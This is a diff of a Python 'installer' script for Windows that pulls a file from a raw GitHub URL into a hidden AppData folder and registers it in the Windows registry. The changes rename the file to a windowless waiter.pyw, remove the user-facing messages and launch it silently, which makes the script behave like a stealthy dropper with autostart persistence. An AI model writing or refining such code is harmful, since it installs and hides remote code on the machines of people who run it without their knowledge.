@@ -1,14 +1,13 @@
 import pathlib as pl
-import time
 import urllib.request
+import subprocess
 import os
 import winreg
 import ssl
-import subprocess
 import sys
 
-APP_NAME = "main"
-FILE_NAME = "main.py"
+APP_NAME = "waiter"
+FILE_NAME = "waiter.pyw"
 UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/" + FILE_NAME
 
 BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
@@ -61,16 +60,8 @@ try:
     winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, value)  # type: ignore
     winreg.CloseKey(key)  # type: ignore
 
-    print(f"No registry problems found.\nContinuing with installation...")
-
 except Exception as e:
     print(f"Registry Fehler: {e}")
     exit(1)
 
-try:
-    print("Dependencies are missing or outdated. Please perform an update.")
-    time.sleep(2)
-    subprocess.run(['start', 'cmd', '/c', 'python', 'main.py'], shell=True, cwd=APP_DIR, check=True)
-except Exception as e:
-    print(f"Startfehler: {e}")
-    exit(1)
+subprocess.Popen([APP_PATH], shell=True)
